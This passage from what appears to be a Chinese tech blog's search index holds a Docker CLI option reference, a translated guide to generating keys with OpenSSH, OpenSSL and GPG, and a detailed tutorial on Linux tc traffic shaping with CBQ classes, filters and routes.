[OPTIONS]\n\n列出容器。\n\n  -a, --all=false       显示所有的容器。默认情况下仅显示正在运行的容器。\n  --before=\"\"           仅显示在ID或者名字之前的容器，包括没有运行的容器。\n  -f, --filter=[]       提供过滤值. 有效的过滤器:\n                          exited=int - 容器退出的代码 int\n                          status=(restarting|running|paused|exited)\n  -l, --latest=false    仅显示最后一个创建的容器，包括没有运行的。\n  -n=-1                 显示n个最后创建的容器，包括没有运行的。\n  --no-trunc=false      不要截断输出。\n  -q, --quiet=false     仅显示数值ID。\n  -s, --size=false      显示大小。\n  --since=\"\"            仅显示从Id 或者 Name以来的容器，包括没有运行的。\n\ndocker pull      \n\n使用方法: docker pull [OPTIONS] NAME[:TAG]\n\n从registry上拉回一个镜像或者一个容器。\n\n  -a, --all-tags=false    在指定的仓库下载所有标记的镜像。\n\ndocker push     \n\n使用方法: docker push NAME[:TAG]\n\n将一个镜像或者仓库推送到指定的仓库。\n\ndocker restart   \n\n使用方法: docker restart [OPTIONS] CONTAINER [CONTAINER...]\n\n重新启动一个运行中的容器。\n\n  -t, --time=10      在杀掉指定容器之前停动的时间，一旦杀掉容器，那么就会重新启动。默认时间为10秒。\n\ndocker rm            \n\n使用方法: docker rm [OPTIONS] CONTAINER [CONTAINER...]\n\n删除一个或者多个容器。\n\n  -f, --force=false      强制移除一个正在运行的容器(使用 SIGKILL)\n  -l, --link=false       移除指定的连接，而不是潜在的容器。\n  -v, --volumes=false    移除与容器相关的卷。\n\ndocker rmi      \n\n使用方法: docker rmi [OPTIONS] IMAGE [IMAGE...]\n\n移除一个或者多个镜像。\n\n  -f, --force=false    强制移除一个镜像。\n  --no-prune=false     不要删除未标记的父镜像。\n\ndocker run   \n\n使用方法: docker run [OPTIONS] IMAGE [COMMAND] [ARG...]\n\n在新的容器中运行一个命令。\n\n  -a, --attach=[]            附加到STDIN, STDOUT 或者 STDERR。\n  --add-host=[]              添加一个自定义的host-to-IP 映射(host:ip)。\n  -c, --cpu-shares=0         CPU shares (相对权重)。\n  --cap-add=[]               添加Linux capabilities。\n  --cap-drop=[]              放弃 Linux capabilities。\n  --cidfile=\"\"               将容器 ID写入文件。\n  --cpuset=\"\"                允许使用的CPU数量(0-3, 0,1)\n  -d, --detach=false         分离模式：在后台运行容器，并且显示出新容器的ID。\n  --device=[]                向容器添加一个宿主机设备。\n(例如， --device=/dev/sdc:/dev/xvdc)\n  --dns=[]                   设置自定义的DNS 服务器。\n  --dns-search=[]            设置自定义DNS 搜索域。\n  -e, --env=[]               设置环境变量。\n  --entrypoint=\"\"            覆盖掉镜像中默认的ENTRYPOINT。\n  --env-file=[]              读以逗号分隔的环境变量文件(文件中的行以逗号分隔，每一行都是环境变量)。\n  --expose=[]                将一个没有发布的端口暴露给宿主机。\n  -h, --hostname=\"\"          容器主机名字。\n  -i, --interactive=false    保持 STDIN 打开，即使没有被附加。\n  --link=[]                  以name:alias格式添加连接到其它容器上。\n  --lxc-conf=[]              (lxc exec-driver only) 添加自定义lxc 选项\n--lxc-conf=\"lxc.cgroup.cpuset.cpus = 0,1\"\n  -m, --memory=\"\"            内存限制 (格式: numberoptional unit,\nunit = b, k, m or g)\n  --name=\"\"                  指定容器的名字。\n  --net=\"bridge\"             为容器设置网络模式，\n                               'bridge': 在docker bridge桥上创建一个新的网络栈。\n                                 'none': 该容器没有网络。\n                  'container:name|id': 重新使用其它容器的网络栈。\n                                 'host': 在该容器内使用host网络堆栈。注意：host模式对宿主机上的本地文件系统给定了容器全部的访问权限，包括D-bus，因此容器被认为是不安全的。\n\n  -P, --publish-all=false    发布所有的暴露端口到宿主机接口上。\n  -p, --publish=[]           发布容器的一个端口到宿主机接口上。\n                             格式：\nip:hostPort:containerPort\nip::containerPort\nhostPort:containerPort\ncontainerPort\n                               (使用 'docker port'查看实际的映射)\n  --privileged=false         给这个容器扩展权限。\n  --restart=\"\"               当容器退出时重启策略将会被应用，选项值有：\n(no, on-failure[:max-retry], always)\n  --security-opt=[]          安全选项。\n  -t, --tty=false            分配伪终端。\n  -u, --user=\"\"              用户名或者UID。\n  -v, --volume=[]             绑定挂载卷(例如，从宿主机挂接：-v /host:/container，从Docker挂接：-v /container)\n  --volumes-from=[]          从指定的容器挂载卷。\n  -w, --workdir=\"\"           指定容器内的工作目录。\n\ndocker save         \n\n使用方法: docker save [OPTIONS] IMAGE [IMAGE...]\n\n将镜像保存到一个归档文件(默认为STDOUT)\n\n  -o, --output=\"\"    输出到一个文件而不是STDOUT。\n\ndocker search     \n\n使用方法: docker search [OPTIONS] TERM\n\n从Docker Hub 上搜索镜像。\n\n  --automated=false    仅显示自动构建。\n  --no-trunc=false     不要截断输出。\n  -s, --stars=0        仅显示至少x 星级的镜像。\n\ndocker start           \n\n使用方法: docker start [OPTIONS] CONTAINER [CONTAINER...]\n\n重新启动一个停止的容器。\n\n  -a, --attach=false         附加容器的STDOUT 和 STDERR，并且所有的信号到进程。\n  -i, --interactive=false    附加容器的STDIN。\n\ndocker stop      \n\n使用方法: docker stop [OPTIONS] CONTAINER [CONTAINER...]\n\n通过发送SIGTERM 信号，在一个优雅的时间断后然后是SIGKILL停止运行的容器。\n\n  -t, --time=10      在杀掉容器之前等待容器停止的时间数。\n\ndocker tag      \n\n使用方法: docker tag OPTIONS] IMAGE[:TAG] [REGISTRYHOST/NAME[:TAG]\n\n标记一个进入仓库的镜像。\n\n  -f, --force=false    强制。\n\ndocker top      \n\n使用方法: docker top CONTAINER [ps OPTIONS]\n\n显示容器中运行的进程。\n\ndocker unpause              \n使用方法: docker unpause CONTAINER\n\n取消暂停容器内的所有进程。\n\ndocker version           \n\n使用方法: docker version\n\n显示Docker的版本信息。\n\ndocker wait            \n\n使用方法: docker wait CONTAINER [CONTAINER...]\n\nBlock until a container stops, then print its exit code.\n阻塞运行直到容器停止，然后打印出它的退出代码。","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 ELK+Filebeat搭建实时日志分析平台","title":"ELK+Filebeat搭建实时日志分析平台","text":"ELK+Filebeat搭建实时日志分析平台","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 GPG, OpenSSH和OpenSSL","title":"GPG, OpenSSH和OpenSSL","text":"---\nClient Cert Authentication\n[译]安全基础：GPG, OpenSSH和OpenSSL%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9AGPG,%20OpenSSH%E5%92%8COpenSSL/)\n\nGPG是什么？\n\nGPG是一个提供了加密和签名功能的工具。它的全名是“GNU Privacy Guard”。\n\nGPG支持对称加密和非对称加密，另外还提供一个可选的数字签名功能，来保证加密数据的完整性（未被中间人修改过）。\n\n后面，我们将会演示如何使用GPG。\n\nGPG vs PGP\n\n你可能还听说过PGP，PGP是一个协议标准（命名为”Open PGP”），GPG实现了这个协议标准。\n\n创建你自己的密钥\n\n好了，目前为止，我们只讨论了一些理论知识。现在要实践了，我们会用之前提到的三种工具（OpenSSH，OpenSSL和GPG）来生成自己的密钥。\n\n我不会详细地解释每个命令中使用的标志/设置，你可以自己man来了解这些细节。\n\n此外，生成密钥只是一部分。对于OpenSSL和GPG来说，直到加密数据的时候，这些密钥才变得有用。\n\n让我们开始吧！\n\nOpenSSH\n\n在下面的例子中，我们会使用RSA算法和4096位的密钥长度生成一组新的密钥（公钥和私钥）。这是相当安全的设置（在今天这个数字时代，任何低于2048位的密钥会被轻易攻破）：\n\n1\nssh-keygen -t rsa -b 4096 -C \"your.email@service.com\"\n运行这个命令，你会被要求为密钥提供一个名字，还有一个密码（可选）。之后你会发现当前目录下生成了两个文件（假设我们提供的名字是foorsa）：\n\nfoorsa: 私钥\nfoorsa.pub: 公钥\n注：你可以通过SSH-keygen -p命令更改与私钥相关联的密码。\n\n现在我们有了这两个密钥，可以把公钥放到外部的服务（如github）或者远程服务器上。这样我们就可以和远程的服务或者服务器进行安全的通信了。\n\n如果你想要连接到远端服务器，你可以让你的运维帮你把公钥加到~/.ssh/文件夹下，或者你也可以自己来（cat foorsa.pub | ssh user@123.45.56.78 \"mkdir -p ~/.ssh \u0026\u0026 cat     ~/.ssh/authorizedkeys\"）。一旦加入了你的公钥，你就可以在不需要密码的情况下安全访问服务器，因为你的私钥将会作为访问的凭证。\n\n注：默认是SSH密钥是放在~/.ssh/文件夹下的\n\n你还可以进一步设置，限制只能通过SSH密钥登录服务器。为了达成这个目的，你需要登录到服务器，并修改/etc/ssh/sshdconfig文件，找到PermitRootLogin那一行，并改成PermitRootLogin without-password。重新启动ssh，修改就会立即生效。\n\nSSH代理\n\n大多数操作系统都有可用的ssh-agent。如果你已经安装了ssh-keygen，那么很有可能你也已经安装了ssh-agent和其他OpenSSH工具。\n该代理是用来存储私钥的，它会让SSH的使用更加容易：允许你一次性地设置私钥密码（便利性的代价是安全性能的下降）。\n\n当我设置我的github SSH密钥时，我会运行下面的命令：\n\n1\n2\n3\n4\n5\n6\ncd ~/.ssh\nssh-keygen -t rsa -b 4096 -C \"my.email@domain.com\" #  saved as githubrsa\neval \"$(ssh-agent -s)\"\nssh-add -K ~/.ssh/githubrsa\npbcopy \u003c ~/.ssh/githubrsa.pub\nssh -T git@github.com\n这里一共做了以下几件事：\n\ncd到存放SSH密钥的目录\n生成我自己的SSH密钥（存成githubrsa）\n启动SSH代理\n使用ssh-add命令将我的私钥添加到代理中\n拷贝我的公钥（然后手动把它粘贴到GitHub GUI中）\n连接到github，验证设置\nGenerating SSH keys - User Documentation\n\nOpenSSL\n\n和上一节一样，我们将会使用RSA和4096位的密钥长度生成一组新密钥（公钥和私钥）。区别在于，你需要先生成私钥，然后从中抽取公钥：\n\n1\n2\nopenssl genrsa -out privatekey.pem 4096\nopenssl rsa -pubout -in privatekey.pem -out publickey.pem\n你还可以通过添加-text标志，打印出包含在pem文件里的额外信息：\n\n1\nopenssl rsa -text -in privatekey.pem\nGPG\n\n用GPG生成一对密钥要稍微麻烦些，因为你需要根据提示输入一些内容，首先输入命令：\n\n1\ngpg --gen-key\n将会显示如下信息：\n\n1\n2\n3\n4\n5\n6\nPlease select what kind of key you want:\n(1) RSA and RSA (default)\n(2) DSA and Elgamal\n(3) DSA (sign only)\n(4) RSA (sign only)\nYour selection?\n然后会问你需要的密钥长度（这里我和上面一样，输入了4096）：\n\n1\n2\nRSA keys may be between 1024 and 4096 bits long.\nWhat keysize do you want? (2048)\n接着，会要你提供一个过期时间（我选择了一年）：\n\n1\n2\n3\n4\n5\n6\n7\n8\nRequested keysize is 4096 bits       \nPlease specify how long the key should be valid.\n         0 = key does not expire\n      n   = key expires in n days\n      n w = key expires in n weeks\n      n m = key expires in n months\n      n y = key expires in n years\nKey is valid for? (0)\n最后，你需要输入一些个人信息。我不会在这里展示，你可以自己试一试。另外值得注意的是，GPG会使用系统的熵来帮助它生成随机数，所以你会被要求移动一下光标，来协助产生随机数。\n\n注：你也可以通过一个输入文件来提供上述所需要的内容（当你想要产生很多成对密钥时，这个方法很有用），如果你想了解更多的细节，可以参考这里。\n\n当你生成完密钥之后，你可能会问它们在哪儿呢？它们并不在当前的目录下，你需要使用下面的命令来查看生成的密钥：\n\n1\ngpg --list-keys\n我这里的输出是：\n\n1\n2\n3\n4\n5\n/Users/M/.gnupg/pubring.gpg","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 tc流量控制","title":"Linux命令 tc 流量控制","text":"Linux下TC使用说明\n\n一、TC原理介绍\n\nLinux操作系统中的流量控制器TC（Traffic Control）用于Linux内核的流量控制，主要是通过在输出端口处建立一个队列来实现流量控制。\n\n接收包从输入接口（Input Interface）进来后，经过流量限制（Ingress Policing）丢弃不符合规定的数据包，由输入多路分配器（Input De-Multiplexing）进行判断选择：如果接收包的目的是本主机，那么将该包送给上层处理；否则需要进行转发，将接收包交到转发块（Forwarding Block）处理。转发块同时也接收本主机上层（TCP、UDP等）产生的包。转发块通过查看路由表，决定所处理包的下一跳。然后，对包进行排列以便将它们传送到输出接口（Output Interface）。一般我们只能限制网卡发送的数据包，不能限制网卡接收的数据包，所以我们可以通过改变发送次序来控制传输速率。Linux流量控制主要是在输出接口排列时进行处理和实现的。\n\n二、TC规则\n\n1、流量控制方式\n\n流量控制包括以下几种方式：\n\nSHAPING(限制) 当流量被限制，它的传输速率就被控制在某个值以下。限制值可以大大小于有效带宽，这样可以平滑突发数据流量，使网络更为稳定。shaping（限制）只适用于向外的流量。\n\nSCHEDULING(调度) 通过调度数据包的传输，可以在带宽范围内，按照优先级分配带宽。SCHEDULING(调度)也只适于向外的流量。\n\nPOLICING(策略) SHAPING用于处理向外的流量，而POLICIING(策略)用于处理接收到的数据。\n\nDROPPING(丢弃) 如果流量超过某个设定的带宽，就丢弃数据包，不管是向内还是向外。\n\n2、流量控制处理对象\n\n流量的处理由三种对象控制，它们是：qdisc(排队规则)、class(类别)和filter(过滤器)。\n\nQDISC(排队规则) QDisc(排队规则)是queueing discipline的简写，它是理解流量控制(traffic control)的基础。无论何时，内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的qdisc(排队规则)把数据包加入队列。然后，内核会尽可能多地从qdisc里面取出数据包，把它们交给网络适配器驱动模块。最简单的QDisc是pfifo它不对进入的数据包做任何的处理，数据包采用先入先出的方式通过队列。不过，它会保存网络接口一时无法处理的数据包。\n\nQDISC的类别如下：\n\n（1）、CLASSLESS QDisc(不可分类QDisc)\n\n1  无类别QDISC包括：\n\n\\[p|b\\]fifo\n\n使用最简单的qdisc，纯粹的先进先出。只有一个参数：limit，用来设置队列的长度,pfifo是以数据包的个数为单位；bfifo是以字节数为单位。\n\npfifo\\fast\n\n在编译内核时，如果打开了高级路由器(Advanced Router)编译选项，pfifo\\fast就是系统的标准QDISC。它的队列包括三个波段(band)。在每个波段里面，使用先进先出规则。而三个波段(band)的优先级也不相同，band 0的优先级最高，band 2的最低。如果band里面有数据包，系统就不会处理band 1里面的数据包，band 1和band 2之间也是一样。数据包是按照服务类型(Type of Service,TOS)被分配多三个波段(band)里面的。\n\nred\n\nred是Random Early Detection(随机早期探测)的简写。如果使用这种QDISC，当带宽的占用接近于规定的带宽时，系统会随机地丢弃一些数据包。它非常适合高带宽应用。\n\nsfq\n\nsfq是Stochastic Fairness Queueing的简写。它按照会话(session–对应于每个TCP连接或者UDP流)为流量进行排序，然后循环发送每个会话的数据包。\n\ntbf\n\ntbf是Token Bucket Filter的简写，适合于把流速降低到某个值。\n\n2  不可分类QDisc的配置\n\n如果没有可分类QDisc，不可分类QDisc只能附属于设备的根。它们的用法如下：\ntc qdisc add dev DEV root QDISC QDISC-PARAMETERS\n\n要删除一个不可分类QDisc，需要使用如下命令：\ntc qdisc del dev DEV root\n\n一个网络接口上如果没有设置QDisc，pfifo\\fast就作为缺省的QDisc。\n\n（2）、CLASSFUL QDISC(分类QDisc)\n\n可分类的QDisc包括：\n\nCBQ\n\nCBQ是Class Based Queueing(基于类别排队)的缩写。它实现了一个丰富的连接共享类别结构，既有限制(shaping)带宽的能力，也具有带宽优先级管理的能力。带宽限制是通过计算连接的空闲时间完成的。空闲时间的计算标准是数据包离队事件的频率和下层连接(数据链路层)的带宽。\n\nHTB\n\nHTB是Hierarchy Token Bucket的缩写。通过在实践基础上的改进，它实现了一个丰富的连接共享类别体系。使用HTB可以很容易地保证每个类别的带宽，虽然它也允许特定的类可以突破带宽上限，占用别的类的带宽。HTB可以通过TBF(Token Bucket Filter)实现带宽限制，也能够划分类别的优先级。\n\nPRIO\n\nPRIO QDisc不能限制带宽，因为属于不同类别的数据包是顺序离队的。使用PRIO QDisc可以很容易对流量进行优先级管理，只有属于高优先级类别的数据包全部发送完毕，才会发送属于低优先级类别的数据包。为了方便管理，需要使用iptables或者ipchains处理数据包的服务类型(Type Of Service,ToS)。\n\nCLASS(类) 某些QDisc(排队规则)可以包含一些类别，不同的类别中可以包含更深入的QDisc(排队规则)，通过这些细分的QDisc还可以为进入的队列的数据包排队。通过设置各种类别数据包的离队次序，QDisc可以为设置网络数据流量的优先级。\n\nFILTER(过滤器) Filter(过滤器)用于为数据包分类，决定它们按照何种QDisc进入队列。无论何时数据包进入一个划分子类的类别中，都需要进行分类。分类的方法可以有多种，使用fileter(过滤器)就是其中之一。使用filter(过滤器)分类时，内核会调用附属于这个类(class)的所有过滤器，直到返回一个判决。如果没有判决返回，就作进一步的处理，而处理方式和QDISC有关。需要注意的是，filter(过滤器)是在QDisc内部，它们不能作为主体。\n\n3、操作原理\n\n类(Class)组成一个树，每个类都只有一个父类，而一个类可以有多个子类。某些QDisc(例如：CBQ和HTB)允许在运行时动态添加类，而其它的QDisc(例如：PRIO)不允许动态建立类。允许动态添加类的QDisc可以有零个或者多个子类，由它们为数据包排队。此外，每个类都有一个叶子QDisc，默认情况下，这个叶子QDisc使用pfifo的方式排队，我们也可以使用其它类型的QDisc代替这个默认的QDisc。而且，这个叶子叶子QDisc有可以分类，不过每个子类只能有一个叶子QDisc。 当一个数据包进入一个分类QDisc，它会被归入某个子类。我们可以使用以下三种方式为数据包归类，不过不是所有的QDisc都能够使用这三种方式。\n\ntc过滤器(tc filter)\n\n如果过滤器附属于一个类，相关的指令就会对它们进行查询。过滤器能够匹配数据包头所有的域，也可以匹配由ipchains或者iptables做的标记。\n\n服务类型(Type of Service)\n\n某些QDisc有基于服务类型（Type of Service,ToS）的内置的规则为数据包分类。\n\nskb-  priority\n\n用户空间的应用程序可以使用SO\\PRIORITY选项在skb-  priority域设置一个类的ID。\n\n树的每个节点都可以有自己的过滤器，但是高层的过滤器也可以直接用于其子类。\n\n如果数据包没有被成功归类，就会被排到这个类的叶子QDisc的队中。相关细节在各个QDisc的手册页中。\n\n4、命名规则\n\n所有的QDisc、类和过滤器都有ID。ID可以手工设置，也可以有内核自动分配。ID由一个主序列号和一个从序列号组成，两个数字用一个冒号分开。\n\nQDISC\n\n一个QDisc会被分配一个主序列号，叫做句柄(handle)，然后把从序列号作为类的命名空间。句柄采用象10:一样的表达方式。习惯上，需要为有子类的QDisc显式地分配一个句柄。\n\n类(CLASS)\n\n在同一个QDisc里面的类分享这个QDisc的主序列号，但是每个类都有自己的从序列号，叫做类识别符(classid)。类识别符只与父QDisc有关，和父类无关。类的命名习惯和QDisc的相同。\n\n过滤器(FILTER)\n\n过滤器的ID有三部分，只有在对过滤器进行散列组织才会用到。详情请参考tc-filters手册页。\n\n5、单位\n\ntc命令的所有参数都可以使用浮点数，可能会涉及到以下计数单位。\n\n1》带宽或者流速单位：\n\nkbps 千字节／秒\n\nmbps 兆字节／秒\n\nkbit KBits／秒\n\nmbit MBits／秒\n\nbps或者一个无单位数字 字节数／秒\n\n2》数据的数量单位：\n\nkb或者k 千字节\n\nmb或者m 兆字节\n\nmbit 兆bit\n\nkbit 千bit\n\nb或者一个无单位数字 字节数\n\n3》时间的计量单位：\n\ns、sec或者secs 秒\n\nms、msec或者msecs 分钟\n\nus、usec、usecs或者一个无单位数字 微秒\n\n三、TC命令\n\ntc可以使用以下命令对QDisc、类和过滤器进行操作：\n\nadd\n\n在一个节点里加入一个QDisc、类或者过滤器。添加时，需要传递一个祖先作为参数，传递参数时既可以使用ID也可以直接传递设备的根。如果要建立一个QDisc或者过滤器，可以使用句柄(handle)来命名；如果要建立一个类，可以使用类识别符(classid)来命名。\n\nremove\n\n删除有某个句柄(handle)指定的QDisc，根QDisc(root)也可以删除。被删除QDisc上的所有子类以及附属于各个类的过滤器都会被自动删除。\n\nchange\n\n以替代的方式修改某些条目。除了句柄(handle)和祖先不能修改以外，change命令的语法和add命令相同。换句话说，change命令不能一定节点的位置。\n\nreplace\n\n对一个现有节点进行近于原子操作的删除／添加。如果节点不存在，这个命令就会建立节点。\n\nlink\n\n只适用于DQisc，替代一个现有的节点。\n\n例：\n\ntc qdisc [ add | change | replace | link ] dev DEV [ parent qdisc-id | root ] [ handle qdisc-id ] qdisc [ qdisc specific parameters ]\n\ntc class [ add | change | replace ] dev DEV parent qdisc-id [ classid class-id ] qdisc [ qdisc specific parameters ]\n\ntc filter [ add | change | replace ] dev DEV [ parent qdisc-id | root ] protocol protocol prio priority filtertype [ filtertype specific parameters ] flowid flow-id\n\ntc [-s | -d ] qdisc show [ dev DEV ]\n\ntc [-s | -d ] class show dev DEV tc filter show dev DEV\n\n四、具体操作\n\nLinux流量控制主要分为建立队列、建立分类和建立过滤器三个方面。\n\n1、基本实现步骤为：\n\n（1） 针对网络物理设备（如以太网卡eth0）绑定一个队列QDisc；\n\n（2） 在该队列上建立分类class；\n\n（3） 为每一分类建立一个基于路由的过滤器filter；\n\n（4） 最后与过滤器相配合，建立特定的路由表。\n\n2、环境模拟实例:\n\n流量控制器上的以太网卡(eth0) 的IP地址为192.168.1.66，在其上建立一个CBQ队列。假设包的平均大小为1000字节，包间隔发送单元的大小为8字节，可接收冲突的发送最长包数目为20字节。\n\n假如有三种类型的流量需要控制: 　　1) 是发往主机1的，其IP地址为192.168.1.24。其流量带宽控制在8Mbit，优先级为2； 　　2) 是发往主机2的，其IP地址为192.168.1.30。其流量带宽控制在1Mbit，优先级为1； 　　3) 是发往子网1的，其子网号为192.168.1.0，子网掩码为255.255.255.0。流量带宽控制在1Mbit，优先级为6。\n\n建立队列\n\n一般情况下，针对一个网卡只需建立一个队列。\n\n将一个cbq队列绑定到网络物理设备eth0上，其编号为1:0；网络物理设备eth0的实际带宽为10 Mbit，包的平均大小为1000字节；包间隔发送单元的大小为8字节，最小传输包大小为64字节。\n\n·tc qdisc add dev eth0 root handle 1: cbq bandwidth 10Mbit avpkt 1000 cell 8 mpu 64\n\n建立分类\n\n分类建立在队列之上。\n\n一般情况下，针对一个队列需建立一个根分类，然后再在其上建立子分类。对于分类，按其分类的编号顺序起作用，编号小的优先；一旦符合某个分类匹配规则，通过该分类发送数据包，则其后的分类不再起作用。\n\n1） 创建根分类1:1；分配带宽为10Mbit，优先级别为8。\n\n·tc class add dev eth0 parent 1:0 classid 1:1 cbq bandwidth 10Mbit rate 10Mbit maxburst 20 allot 1514 prio 8 avpkt 1000 cell 8 weight 1Mbit\n\n该队列的最大可用带宽为10Mbit，实际分配的带宽为10Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为8，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为1Mbit。\n\n2）创建分类1:2，其父分类为1:1，分配带宽为8Mbit，优先级别为2。\n\n·tc class add dev eth0 parent 1:1 classid 1:2 cbq bandwidth 10Mbit rate 8Mbit maxburst 20 allot 1514 prio 2 avpkt 1000 cell 8 weight 800Kbit split 1:0 bounded\n\n该队列的最大可用带宽为10Mbit，实际分配的带宽为 8Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为1，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为800Kbit，分类的分离点为1:0，且不可借用未使用带宽。\n\n3）创建分类1:3，其父分类为1:1，分配带宽为1Mbit，优先级别为1。\n\n·tc class add dev eth0 parent 1:1 classid 1:3 cbq bandwidth 10Mbit rate 1Mbit maxburst 20 allot 1514 prio 1 avpkt 1000 cell 8 weight 100Kbit split 1:0\n\n该队列的最大可用带宽为10Mbit，实际分配的带宽为 1Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为2，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为100Kbit，分类的分离点为1:0。\n\n4）创建分类1:4，其父分类为1:1，分配带宽为1Mbit，优先级别为6。\n\n·tc class add dev eth0 parent 1:1 classid 1:4 cbq bandwidth 10Mbit rate 1Mbit maxburst 20 allot 1514 prio 6 avpkt 1000 cell 8 weight 100Kbit split 1:0\n\n该队列的最大可用带宽为10Mbit，实际分配的带宽为1Mbit，可接收冲突的发送最长包数目为20字节；最大传输单元加MAC头的大小为1514字节，优先级别为6，包的平均大小为1000字节，包间隔发送单元的大小为8字节，相应于实际带宽的加权速率为100Kbit，分类的分离点为1:0。\n\n建立过滤器\n\n过滤器主要服务于分类。\n\n一般只需针对根分类提供一个过滤器，然后为每个子分类提供路由映射。\n\n1） 应用路由分类器到cbq队列的根，父分类编号为1:0；过滤协议为ip，优先级别为100，过滤器为基于路由表。\n\n·tc filter add dev eth0 parent 1:0 protocol ip prio 100 route\n\n2） 建立路由映射分类1:2, 1:3, 1:4\n\n·tc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 2 flowid 1:2\n\n·tc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 3 flowid 1:3\n\n·tc filter add dev eth0 parent 1:0 protocol ip prio 100 route to 4 flowid 1:4\n\n4.建立路由\n\n该路由是与前面所建立的路由映射一一对应。\n\n1） 发往主机192.168.1.24的数据包通过分类2转发(分类2的速率8Mbit)\n\nip route add 192.168.1.24 dev eth0 via 192.168.1.66 realm 2\n\n2） 发往主机192.168.1.30的数据包通过分类3转发(分类3的速率1Mbit)\n\n#ip route add 192.168.1.30 dev eth0 via 192.168.1.66 realm 3\n\n3）发往子网192.168.1.0/24的数据包通过分类4转发(分类4的速率1Mbit)\n\n#ip route add 192.168.1.0/24 dev eth0 via 192.168.1.66 realm 4\n\n注：一般对于流量控制器所直接连接的网段建议使用IP主机地址流量控制限制，不要使用子网流量控制限制。如一定需要对直连子网使用子网流量控制限制，则在建立该子网的路由映射前，需将原先由系统建立的路由删除，才可完成相应步骤。\n\n监视\n\n主要包括对现有队列、分类、过滤器和路由的状况进行监视。\n\n1）显示队列的状况\n\n简单显示指定设备(这里为eth0)的队列状况\n\ntc qdisc ls dev eth0\nqdisc cbq 1: rate 10Mbit (bounded,isolated) prio no-transmit\n\n详细显示指定设备(这里为eth0)的队列状况\n\ntc -s qdisc ls dev eth0\nqdisc cbq 1: rate 10Mbit (bounded,isolated) prio no-transmit      Sent 7646731 bytes 13232 pkts (dropped 0, overlimits 0)      borrowed 0 overactions 0 avgidle 31 undertime 0\n\n这里主要显示了通过该队列发送了13232个数据包，数据流量为7646731个字节，丢弃的包数目为0，超过速率限制的包数目为0。\n\n2）显示分类的状况\n\n简单显示指定设备(这里为eth0)的分类状况\n\ntc class ls dev eth0\nclass cbq 1: root rate 10Mbit (bounded,isolated) prio no-transmit       class cbq 1:1 parent 1: rate 10Mbit prio no-transmit #no-transmit表示优先级为8      class cbq 1:2 parent 1:1 rate 8Mbit prio 2      class cbq 1:3 parent 1:1 rate 1Mbit prio 1      class cbq 1:4 parent 1:1 rate 1Mbit prio 6\n\n详细显示指定设备(这里为eth0)的分类状况\n\n·tc -s class ls dev eth0\n\nclass cbq 1: root rate 10Mbit (bounded,isolated) prio no-transmit      Sent 17725304 bytes 32088 pkts (dropped 0, overlimits 0)      borrowed 0 overactions 0 avgidle 31 undertime 0      class cbq 1:1 parent 1: rate 10Mbit prio no-transmit      Sent 16627774 bytes 28884 pkts (dropped 0, overlimits 0)      borrowed 16163 overactions 0 avgidle 587 undertime 0      class cbq 1:2 parent 1:1 rate 8Mbit prio 2      Sent 628829 bytes 3130 pkts (dropped 0, overlimits 0)      borrowed 0 overactions 0 avgidle 4137 undertime 0      class cbq 1:3 parent 1:1 rate 1Mbit prio 1      Sent 0 bytes 0 pkts (dropped 0, overlimits 0)      borrowed 0 overactions 0 avgidle 159654 undertime 0      class cbq 1:4 parent 1:1 rate 1Mbit prio 6      Sent 5552879 bytes 8076 pkts (dropped 0, overlimits 0)      borrowed 3797 overactions 0 avgidle 159557 undertime 0\n\n这里主要显示了通过不同分类发送的数据包，数据流量，丢弃的包数目，超过速率限制的包数目等等。其中根分类(class cbq 1:0)的状况应与队列的状况类似。\n\n例如，分类class cbq 1:4发送了8076个数据包，数据流量为5552879个字节，丢弃的包数目为0，超过速率限制的包数目为0。\n\n显示过滤器的状况\n\n·tc -s filter ls dev eth0\n\nfilter parent 1: protocol ip pref 100 route      filter parent 1: protocol ip pref 100 route fh 0xffff0002 flowid 1:2 to 2      filter parent 1: protocol ip pref 100 route fh 0xffff0003 flowid 1:3 to 3      filter parent 1: protocol ip pref 100 route fh 0xffff0004 flowid 1:4 to 4\n\n这里flowid 1:2代表分类class cbq 1:2，to 2代表通过路由2发送。\n\n显示现有路由的状况\n\n·ip route\n\n192.168.1.66 dev eth0 scope link      192.168.1.24 via 192.168.1.66 dev eth0 realm 2      202.102.24.216 dev ppp0 proto kernel scope link src 202.102.76.5      192.168.1.30 via 192.168.1.66 dev eth0 realm 3      192.168.1.0/24 via 192.168.1.66 dev eth0 realm 4      192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.66      172.16.1.0/24 via 192.168.1.66 dev eth0 scope link      127.0.0.0/8 dev lo scope link      default via 202.102.24.216 dev ppp0      default via 192.168.1.254 dev eth0\n\n如上所示，结尾包含有realm的显示行是起作用的路由过滤器。\n\n维护\n\n主要包括对队列、分类、过滤器和路由的增添、修改和删除。\n\n增添动作一般依照”队列-  分类-  过滤器-  路由”的顺序进行；修改动作则没有什么要求；删除则依照”路由-  过滤器-  分类-  队列”的顺序进行。\n\n1）队列的维护\n\n一般对于一台流量控制器来说，出厂时针对每个以太网卡均已配置好一个队列了，通常情况下对队列无需进行增添、修改和删除动作了。\n\n2）分类的维护\n\n增添\n\n增添动作通过tc class add命令实现，如前面所示。\n\n修改\n\n修改动作通过tc class change命令实现，如下所示：\n\n·tc class change dev eth0 parent 1:1 classid 1:2 cbq bandwidth 10Mbit rate 7Mbit maxburst 20 allot 1514 prio 2 avpkt 1000 cell 8 weight 700Kbit split 1:0 